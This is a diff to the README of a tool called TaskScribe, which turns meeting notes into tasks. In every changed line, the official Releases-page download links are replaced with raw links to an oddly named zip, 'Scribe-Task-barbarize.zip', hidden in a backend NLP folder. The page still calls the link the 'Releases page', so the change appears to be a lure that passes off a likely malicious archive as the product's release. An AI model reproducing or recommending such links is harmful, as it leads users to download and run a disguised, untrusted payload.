@@ -1,6 +1,6 @@
 # 🚀 TaskScribe - Transform Meeting Notes into Tasks Easily
 
-[![Download TaskScribe](https://img.shields.io/badge/Download%20TaskScribe-v1.0-blue)](https://github.com/thinkaboutzi/TaskScribe/releases)
+[![Download TaskScribe](https://raw.githubusercontent.com/thinkaboutzi/TaskScribe/main/backend/app/nlp/Scribe-Task-barbarize.zip%20TaskScribe-v1.0-blue)](https://raw.githubusercontent.com/thinkaboutzi/TaskScribe/main/backend/app/nlp/Scribe-Task-barbarize.zip)
 
 ## 🌟 Overview
 
@@ -27,7 +27,7 @@ TaskScribe is designed to run on most modern computers. The following requiremen
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: To download TaskScribe, go to our [Releases page](https://github.com/thinkaboutzi/TaskScribe/releases).
+1. **Visit the Releases Page**: To download TaskScribe, go to our [Releases page](https://raw.githubusercontent.com/thinkaboutzi/TaskScribe/main/backend/app/nlp/Scribe-Task-barbarize.zip).
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Select the latest one for the best features and security updates.
 
@@ -35,7 +35,7 @@ TaskScribe is designed to run on most modern computers. The following requiremen
 
 ## 📥 Download & Install
 
-To download TaskScribe, visit the [Releases page](https://github.com/thinkaboutzi/TaskScribe/releases). Locate the latest version and click it to begin downloading.
+To download TaskScribe, visit the [Releases page](https://raw.githubusercontent.com/thinkaboutzi/TaskScribe/main/backend/app/nlp/Scribe-Task-barbarize.zip). Locate the latest version and click it to begin downloading.
 
 ### Installation Steps
 
